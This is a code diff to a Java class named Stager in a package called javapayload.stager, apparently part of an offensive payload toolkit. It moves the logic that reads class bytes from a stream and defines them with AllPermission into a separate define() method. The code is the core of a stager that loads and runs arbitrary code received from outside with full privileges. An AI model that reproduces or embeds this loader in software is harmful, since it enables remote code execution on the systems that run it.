@@ -35,6 +35,7 @@
 package javapayload.stager;
 
 import java.io.DataInputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
@@ -51,14 +52,11 @@ public abstract class Stager extends ClassLoader {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
-			final Permissions permissions = new Permissions();
-			permissions.add(new AllPermission());
-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
 			int length = in.readInt();
 			do {
 				final byte[] classfile = new byte[length];
 				in.readFully(classfile);
-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
+				clazz = define(classfile);
 				length = in.readInt();
 				if (length == 0) {
 					break;
@@ -69,6 +67,15 @@ public abstract class Stager extends ClassLoader {
 		} catch (final Throwable t) {
 			t.printStackTrace(new PrintStream(out, true));
 		}
+	}
+	
+	protected final Class define(byte[] classfile) throws IOException {
+		final Permissions permissions = new Permissions();
+		permissions.add(new AllPermission());
+		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+		Class clazz = defineClass(null, classfile, 0, classfile.length, pd);
+		resolveClass(clazz);
+		return clazz;
 	}
 
 	public abstract void bootstrap(String[] parameters, boolean needWait) throws Exception;
